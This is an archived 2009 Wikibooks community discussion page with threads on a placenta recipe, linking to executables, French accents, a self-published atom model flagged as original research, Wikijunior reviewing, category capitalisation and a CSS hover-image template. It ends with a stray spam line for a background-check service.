Can someone here look at [[Cookbook:Placenta_with_Broccoli]]. It's in a [http://blogs.riverfronttimes.com/stlog/2009/03/placenta_for_lunch.php blogpost], and I'm a tad worried about potential health issues that the current article does not warn of. Next to that, it's also a tad distasteful to a rather large portion of the world I guess, and lastly, it might be a press magnet if that blog posting gets more attention. Someone should review what to do about this. [[Special:Contributions/82.75.218.92|82.75.218.92]] ([[User talk:82.75.218.92|talk]]) 00:57, 3 March 2009 (UTC)

:Thanks for raising this concern. I'm afraid Wikibooks is not censored, so it won't be removed on grounds of taste. The content is all created by volunteers, so if someone adds information on any valid health concerns then that's great. Until they do so, it'll probably just stay the way it is. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual? Quite''']]&lt;/font&gt; &lt;sup&gt;&lt;font color=&quot;#306754&quot;&gt;[[User talk:QuiteUnusual|TalkQu]]&lt;/font&gt;&lt;/sup&gt; 08:40, 3 March 2009 (UTC)

== Top-of-the-page notices ==

For a while now I've been thinking how very useful it would be to be able to get out news to the greater community on several issues. I've seen Wikiversity place notices at the top of the page (presumably the same way [[User:WikimediaNotifier]] does). Does anyone have objections to this or have a better suggestion? If not, where do we set these messages? --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 07:01, 2 March 2009 (UTC)

:No objections from me. [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 10:30, 4 March 2009 (UTC)

== Linking to Windows exectutables ==

There's a link on [[Arabic/LearnRW#Downloads]] that goes directly to an &lt;tt&gt;.exe&lt;/tt&gt; file on a foreign website. I think these sort of links should have big warning messages since these executables could contain malware. -[[User:Alan Trick|Alan Trick]] ([[User talk:Alan Trick|talk]]) 19:41, 2 March 2009 (UTC)

:You can fix the link yourself, it points to what seems to be a demo version (until registered) of the program. A better link would be the main site or the page advertising the program itself, as it is I doubt that it is malware but is not very useful either...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 20:07, 3 March 2009 (UTC)
== use of French accents on capital letters ==

I would like to know if it is correct to use French accents on capital letters at the beginning of a word or sentence, and whether they are used on capitals at the beginning of a name e.g. École des Hautes Études. Thanks
: It is correct, however in practice they are often left out. [[User:Junesun|Junesun]] ([[User talk:Junesun|talk]])
: To elaborate, L'académie française states in their [http://www.academie-francaise.fr/langue/questions.html#accentuation FAQ] that it is preferred, but that it is acceptable to leave them out. --[[User:Alan Trick|Alan Trick]] ([[User talk:Alan Trick|talk]]) 17:49, 2 March 2009 (UTC)

== Introduction to Myself and A New Visualization of The Atom ==

Hi everyone. I wrote the WikiBook [[A_New_Model_of_the_Atom]] last year. It's A New Visualization of The Atom. A new way to view, teach, and understand the basics of atoms, and how they interact to form molecules. I didn't introduce myself earlier as I'm just now learning my way around Wiki. Previously, I didn't know that I could or should introduce myself. I am an electrical engineer by training and a Wannabe Renaissance Man by armchair. Originally from Northern Virginia, I moved to the Silicon Valley 25+ years ago to work and raise my family. My kids think my knowledge is like an ocean that covers the earth. But, I'll add that such a notion is a shallow ocean.
   
As my kids (they are twins) went through school they had a lot of trouble understanding the atom. They found my explanations made this difficult subject much more comprehensible than what they received in science class. Once I got my analogy of atomic theory into the heads of my children, they could “see” how pressure and heat can turn carbon to diamond, why the transformation increases carbon’s density, and why the diamond bonds are so strong. They can now understand the chemistry of why mayonnaise emulsifies oil with vinegar. I didn’t get that understanding from 8th grade science and chemistry, nor even high school. They were often far ahead of their classmates in many areas of middle and high school. From a class of 900, I like to think I had something to do with the payoff of watching them walk to the podium to receive awards as their names were announced 21 times from the graduation program pamphlet. Now in college, they have told me that my explanations, on a multitude of subjects, have often placed them significantly ahead of classmates. They ask me to write a book, so this is its beginning.

[[A_New_Model_of_the_Atom]] is intended for intermediate and high school students (or any non-physicist adult) desiring a better understanding of atoms and how they create molecules. I welcome constructive criticism. Please let me know if parts are unclear or need expansion. If readers find it useful, I'll add more ways to understand some complex issues without math. I'd like to expand upon the duality of light and add some drawings to the &quot;Double-Slit&quot; experiment. Some other possible subjects include:
 
:&quot;How Neutrinos Can Travel Through a Wall of Lead One Light Year Thick&quot; 
:&quot;How a Teaspoon of Neutrons can Weigh 1 Billion Tons&quot;
:&quot;How Dark Matter and Dark Energy Could Give Shape to the Cosmos&quot;
:&quot;Why One Cannot Make an Electrical Generator Big Enough to Run an Electric Motor to Run the Generator&quot;

Please leave comments at [[Talk:A_New_Model_of_the_Atom]]&amp;nbsp; &lt;&lt; '''Pcfjr9''' &amp;nbsp;([[User:Pcfjr9|Page]])&amp;nbsp;  &lt;&lt; [[User:Pcfjr9|Pcfjr9]] ([[User talk:Pcfjr9|talk]]) 21:49, 22 March 2009 (UTC)
== Reviewing Wikijunior pages ==

For most books, it makes sense to me that stub pages (at least) would be unreviewed.  If casual vandalism occasionally crops up, well, we're adults (or are choosing to operate in that mode), we can shake our heads at the foolhardiness of people who waste their time on earth doing such things, clean up the mess, and go on with our business.  However, I do think wikijunior ought to be more resistant to casual vandalism.  (Note the repellent notice currently at the top of the [[Wikijunior|wikijunior main page]].)  I don't see any separate rule for wikijunior, to the effect that even developing pages should be reviewed as minimally acceptable (regardless of whether they meet the [[Using Wikibooks/Reviewing Pages#Page Criteria|acceptability criteria]]); but it seems to me this should be a specifically acknowledged exception to the usual criteria.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 14:30, 1 February 2009 (UTC)

: While I agree that this can be a problem, I'm not sure where exactly you're going with this. Are you asking for help to do a once-over review of Wikijunior?
: As for that notice on the Wikijunior main page which advises readers not to log in, they can also change a setting in their preferences (stability tab) to always show the stable version if it exists. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 03:57, 2 February 2009 (UTC)

:::What I have in mind is something other than the mere amount of work involved, although I certainly wouldn't want to discourage others pitching in to help.  I'll try to be clearer.  As I read the acceptability criteria, ''any'' page can be straightforwardly upgraded to acceptable composition and accuracy; that's just good spelling and grammar, and truth or partial truth.  Even if you're not sure what a problem passage was supposed to mean, it should be pretty easy to replace it with something (or sometimes with nothing) that at least meets those criteria.  However, upgrading some pages to acceptable ''coverage'' would require adding more material.  I believe it ought to be possible for wikijunior books to contain stub pages, which more-or-less by definition have not yet achieved acceptable coverage &amp;mdash; and at the same time I believe '''all''' wikijunior pages should always have a reviewed version, so that casual vandalism will not instantly appear on the default page.  I'm proposing that
:::*there should be an exception to the acceptable coverage criterion to allow wikijunior pages to be reviewed as having acceptable coverage even if they're stubs, and while we're at it
:::*there ought to be an explicit statement somewhere that wikijunior pages should be brought up to acceptable review status promptly, preferably before their link to the book's main page is reviewed.
:::Alternatively, perhaps the acceptable coverage criterion is meant to be weaker than I'm reading it to be, in which case the fact that I've misunderstood it suggests that some rephrasing of the criterion is in order.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 13:02, 2 February 2009 (UTC)

::::Looking at [[Help:Revision review]], the acceptable coverage criterion stated there ''does'' look enormously weaker than what I was going by &amp;mdash; presumably my difficulty was because I was working off of the version at Using Wikibooks, which is much stronger (on a relative scale).  The question then becomes, which version of the criterion is more &quot;official&quot;?  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 13:25, 2 February 2009 (UTC)

::::: I'd say that the help and project namespaces should be considered the official version. This whole thing is very new, however, and as such is still in flux as we decide what these things should mean.
::::: While there is a notice up top, alerting users that modules are unreviewed. I can see your viewpoint about the special nature of Wikijunior and guess we wouldn't want readers' guardians feeling that users might be stumbling onto something they consider offensive. I suggest we just interpret &quot;acceptable&quot; as acceptable enough to justify the sighting in light of the audience. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 22:08, 2 February 2009 (UTC)

:: Feel free to clarify the &quot;repellent&quot; note. And yes, I think such a repellent note is needed. Otherwise Wikijunior's reputation (and maybe also Wikibooks' reputation) will seriously suffer when parents realize what images are used for vandalism. (Imagine a mass media article with one of these images.) --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 09:47, 2 February 2009 (UTC)

:::I mean that the notice repels potential readers.  It's scarcely short of &quot;Go away!&quot;  And although I'm sure it's not perfectly worded (Swift makes a good point about default settings), I wasn't criticizing its content.  I'm lamenting that there is cause for it.  After giving some thought to how it might be rephrased, I decided that I was going at the problem from the wrong end.  As long as there are unreviewed pages on wikijunior, that heightens the severity of warning that's called for.  '''If''' every single page on all of wikijunior had a reviewed version, then I think we could make that notice considerably smaller and less... repellent.  So I started reviewing pages.  As I've slowly worked my way into the task, I've observed this matter of acceptable coverage that seemed like it ought to be clarified.  --[[User:Pi zero|Pi zero]] ([[User talk:Pi zero|talk]]) 13:02, 2 February 2009 (UTC)

:::: I agree that the notice is warranted in the case of Wikijunior, but I see it as a great tool not to repel, but draw in new users. I think that rather than the current negative &quot;beware of bad content&quot; we should have a positive &quot;stable versions (of reviewed pages) are served to ensure quality&quot;. I'll be bold later today if no-one beats me to it. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 22:08, 2 February 2009 (UTC)

I've just finished going through [[Wikijunior:Big Cats]] reviewing all the pages.  I corrected some grammar and made a few other tweaks here and there as I went too, so I think the book is better for my efforts.  The book could still us more attention though - it needs to standardize the way it shows measurements.  Sometimes they are in metric, sometimes they are in English, sometimes both (but in both orders).  Also I didn't start correcting the capitalization of cat names (i.e., &quot;The Lynx is a cat&quot; -&gt; &quot;The lynx is a cat&quot;) until I was pretty far into it, and I didn't go back and check the earlier pages.  So there's still plenty that could be done to improve this wonderful book. I encourage other Wikibookians to adopt a Wikijunior book and do the same.  IMO, we should start with the featured books, as I assume those get the most traffic, and those books that are frequent vandalism targets, as the project stands to benefit the most from having reviewed versions of those pages. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 03:32, 6 February 2009 (UTC)

== Watchlist question ==

Maybe this is really a question for assistance, but here goes anyways.  Is there a way to add all submodules of an existing book to my watch list with out going through them one by one and adding them? [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 11:42, 18 February 2009 (UTC)

:Sorry for taking so long to answer your question! This is a very common question, but unfortunately the answer is no. There is no way to automatically add these pages to your watchlist all at once. You can go though the list manually and add them. Or, you can use the page [[Special:RecentChangesLinked]] to view all the changes made to pages linked from the page, but this doesn't happen in your watchlist, it happens on a separate page. I hope this helps! --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 20:29, 18 February 2009 (UTC)

:You can also update your watch list by going to [[Special:PrefixIndex]] to list all pages starting with the name of the book. You can then cut and paste the page names into your watchlist at [[Special:Watchlist/raw]]. Note, however, that the list of pages at PrefixIndex is in a 3-column format (separated by tabs), but in order to copy the page names to your watchlist, you need to list just one page per line.  You could do this manually in a text editor if there are just a few entries, but if there are several hundred, this could get tedious. One solution is to use your word processor's search and replace feature, replacing tabs with newline characters. (e.g., in Microsoft Word, replace &quot;^t&quot; with &quot;^l&quot;). &amp;mdash; [[User:Brim|Brim]] ([[User talk:Brim|talk]]) 04:40, 12 March 2009 (UTC)

== Response Requested ==

Hi - I wrote the Wikibook: 

[[A New Model of the Atom]] http://en.wikibooks.org/wiki/A_New_Model_of_the_Atom

I received an unfavorable comment and a favorable comment. 

The favorable:

::&quot;A reader requests that this page or book be expanded to include more content...
::Please continue to improve this material, even after this message has been removed...&quot; 

The unfavorable:

::&quot;This book appears to contain original research or unverifiable material. Wikibooks policy requires that all book material here be verifiable. 
::Original research and unsupported claims are not acceptable here. Such material might be suitable at Wikiversity instead.
::If this material is not original research, or if it has been fixed to be properly cited and verifiable, this template may be removed. 
::For help, see WB:CHAT.&quot;

Most people have no idea how the atom &quot;works&quot; or how atoms link together becoming molecules. [[A New Model of the Atom]] is my original, intellectual proposal of explaining sub-atomic and molecular structure in a manner comprehensible to average Intermediate School, High School, and non-science Undergraduate Students. I believe my approach is superior to how atomic theory was presented to me in High School (it was incomprehensible). I am encouraged that &quot;A reader requests that this page or book be expanded...&quot; and I hope to get feedback from additional junior scientist.

I do make some claims for which I have not the tools to verify, but I suggest some ways they may be verified. If others can show my claims are impossible, then I will remove them. If they cannot disprove my claims, then I suggest we have found a viable point of controversy worth exploring. For thousands of years people believed the world was flat and displayed much hostility to a helio-centric universe. Today's scientists have 80+ years invested in current quantum atomic theory. They have a lot to lose. The more hostile they are to a new idea, without being able to disprove it, the more that new idea should be explored. Overall, my model does not upset the larger view of current theory. And, I don't believe I should be placed under &quot;house arrest&quot; just because it does not conform to the deeper parts of quantum mechanics, unless my detractors can supply contrary proof. Even then, my model may still prove a better introductory tool than current models.

However, given my arguments, if part of them do not conform to the WikiBook Guidelines, then advise me of which parts to remove and I shall.

If I have placed my ideas in the wrong Wiki, then please advise where it should be and I will move it.

== Subject category case ==

Various Wikibookians have been implementing different casing schemes for subject categories. There was a discussion on this at [[Subject talk:Major Subjects]] and I updated [[Wikibooks:Subject pages]] with directions to use sentence case and the rationale. Essentially, book categories (tend to?) use title case so using sentence case helps avoid conflicts where possible.

In the interest of getting the word out there and soliciting comments, I'd like to bring this here. Please discuss away. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 15:03, 21 March 2009 (UTC)

: I am definitely in favor of Title Casing for subjects, as I think of these of subjects as having proper names.  I appreciate the difficulty that you may end up with a subject and book that have the same name, but there is no restriction that the category for the pages of the book needs to have the same name as the book itself.  These conflicts could be resolved in other ways.  On a related note, we should find a consistent way to resolve these conflicts anyways.  I quickly found the Algebra textbook conflicted with the Algebra subject, and what ever we decide about casing will not fix this,  these types of conflict will always arise.   

: In the end, this would necessitate changing even several top level subjects.  But I suppose that at the heart of issue for me is simply that phrases like &quot;Fine arts&quot; &quot;Social sciences&quot; seem quite out of place to me.  [[User:Thenub314|Thenub314]] ([[User talk:Thenub314|talk]]) 16:49, 21 March 2009 (UTC)

:: To those of the other viewpoint, &quot;Fine Arts&quot; and &quot;Social Sciences&quot; as subjects are out of place. They seem most natural as &quot;fine arts&quot; and &quot;social sciences&quot; to me (the first capital letter has nothing to do with capitalisation schemes). --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 17:13, 21 March 2009 (UTC)

: I like the lowercase scheme and think that there ought to be an option to allow the first character of category names to be case sensitive separate from [[mw:Manual:$wgCapitalLinks|$wgCapitalLinks]], so that both Category:algebra and Category:Algebra can co-exist. Perhaps if there is enough support for this idea, the developers would accept such an option. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 21:25, 21 March 2009 (UTC)

: I agree with [[User:Swift|Swift]] and [[User:Thenub314|Thenub314]] as for the issue of Fine Arts or Social Sciences labels I think it will best used on the subject namespace. Categories should be more strict, in any case when I did attempt to do some work on the subject I attempted to reduce the use of categories to the title of the book (capital) and the foremost related subject on the title page of books all subpages were tagged as belonging only to the book category so the category function performs the function what it has always been used for to provide and alternative navigational scheme for books content, enables the use of the subject namespace without collision of function and an easier maintenance. I have also linked together categories ie: the Programming will have subcategories like C, C++, ASM and other, reducing the need to use generalist categories like the above mentioned Fine Arts or Social Sciences. But without a proper guideline doing work on that namespace is futile...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 23:51, 21 March 2009 (UTC)
== Helping on the Technical Theatre book. ==

Hello, I was recently reading over the [[Technical Theatre]] wikibook and noticed that it could use a lot of work. 
I found the book to assume the reader already knows basic terminology and concepts. I hope to see the book expanded into a comprehensive textbook. I am a professional stagehand, and would like to see the wikibook become a reference that I can send people new to the trade to for basic education needs.

== Outdated Review backlog ==

A large portion of the outdated reviews appear to be within [[:Category:Foundations_of_Education_and_Instructional_Assessment]] - although we're not supposed to sic bots on them, I'm finding that there's at least a few hundred paged within that category alone, and it may take an automated task to do cleat that to a semi-manageable level.

== How to read guide ==

I have been writing Wikipedia for about three years now, but have not explored the other projects of the Wikimedia Foundation much. To make a long story short, I woke up this morning wondering if a system could be developed to teach someone to read using pictures and sound files--that is, a human-less teacher. There are books in the works here to teach English as a second language and these are undoubtedly helpful. But if you could sit a person, of any age who cannot read, in front of a computer and teach them to read, then allow them to expand their skills by reading WikiJunior, the Simple English wiki, Simple English Wikictionary, and eventually Wikipedia itself, well, that would be kind of cool. Obviously, there is no substitute for a human teacher, but this could also serve as a lesson plan as well. Is this something that the community would be interested in developing? Thanks!

:There is a picture dictionary in the [http://es.wikibooks.org/wiki/Espa%C3%B1ol_/_como_lengua_extranjera_/_Vocabulario Spanish wikibooks project]. Maybe the main challenge for this kind of projects is the lack of sound files. While there are many [http://commons.wikimedia.org/wiki/Category:English_pronunciation sound files] for English, many of them are just names of nations, etc. If you are really interested in doing such a project, I would recommend that you make sure how to create sound files that you might need. I would also suggest that you don't expect a lot of help by other authors; thus, I would recommend that you better start with a small project that you are able to complete alone in case this is necessary. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 12:05, 29 March 2009 (UTC)

== Image rollovers ==

Hi, I'm writing a wikibook and think it would be useful as an aid to understanding to be able to change an image slightly when the user moves the mouse over it. I can imagine that this could be useful for other books too (e.g. to make an arrow appear when you mouse over an image, highlighting a particular point). I've hacked an example together using css, but at the moment this requires users to add the following line to their personal css file
 .hoverContainer:hover .hideOnHover {visibility:hidden}
I have three questions about this
# Is this a sensible general idea, or does it conflict with ideas of what a wikibook should do?
# Is my implementation reasonable? I've allowed the image captions to change on mouseover too, but this becomes a bit hacky (e.g. the mouseover caption is assumed to be longer than the normal text).
# '''If it is considered useful, can the appropriate css line (it is very simple) be placed in the system-wide ''common.css'' file'''
Here's the example, with not terribly relevant test images. It obviously won't work until you add the above line to [[Special:Mypage/monobook.css]]. 
&lt;div class=&quot;hoverContainer&quot; style=&quot;position: relative&quot;&gt;[[Image:Nymphaea tetragona.jpg|none|thumb|200px|Now it is a waterlily, blah blah blah blah blah blah blah blah blah blah blah blah blah]]
&lt;div  class=&quot;hideOnHover&quot; style=&quot;position: absolute; left: 0; top: 0; bottom:0; background-color: white;&quot;&gt;&lt;div&gt;[[Image:Gerbera_pink.jpg|none|thumb|200px|Pink Gerbera: picture should change when you place your mouse over it]]&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
Generated by the following wiki code
&lt;pre&gt;&lt;div class=&quot;hoverContainer&quot; style=&quot;position: relative&quot;&gt;[[Image:Nymphaea tetragona.jpg|none|thumb|200px|Now it is a waterlily, blah blah blah blah blah blah blah blah blah blah blah blah blah]]

:: -- [[User:HYanWong|HYanWong]] ([[User talk:HYanWong|talk]]) 22:51, 25 February 2009 (UTC)

Hi HYanWong, I just tried your template - it is great! I notice also that since it ''returns an image coding'' it can replace image coding within other templates that require it.   For example, to use your template ''within'' Noframeleft, (to make ''frameless'' images ''with'' a caption):

&lt;poem&gt;
&lt;nowiki&gt;{{noframeleft|{{HoverImage|Clematis Josephine1.jpg|Clematis hybrid3 ies.jpg|2500x150px}}|'''Figure 1''': ''Hover the image''}}&lt;/nowiki&gt;
&lt;/poem&gt;
{{noframeleft|{{HoverImage|Clematis Josephine1.jpg|Clematis hybrid3 ies.jpg|2500x150px}}|'''Figure 1''': ''Hover the image''}}
It does the thing on the left: Or, in a drop-box, this:
{{dropimage|align=center|Press for Hover Example|{{noframecenter|{{HoverImage|Clematis Josephine1.jpg|Clematis hybrid3 ies.jpg|2500x150px}}|'''Figure 1''': ''Hover the image''}} }}
&lt;br clear=right&gt;

: With the good old &quot;print version&quot; approach it's no problem to use &lt;nowiki&gt;&lt;includeonly&gt; and &lt;noinclude&gt;&lt;/nowiki&gt; to have a screen version and a different print version. You would use the hover image only in the screen version (inside &lt;nowiki&gt;&lt;noinclude&gt;&lt;/nowiki&gt; and &lt;nowiki&gt;&lt;/noinclude&gt;&lt;/nowiki&gt;) and maybe an array of images in the print version (inside &lt;nowiki&gt;&lt;includeonly&gt;&lt;/nowiki&gt; and &lt;nowiki&gt;&lt;/includeonly&gt;&lt;/nowiki&gt;). With the printing of collections, I guess you have to define a template called PrintHoverImage to provide an alternative for printing.

Our of course took advantage of the great offer for the background check service, and want to thank US Search for it.
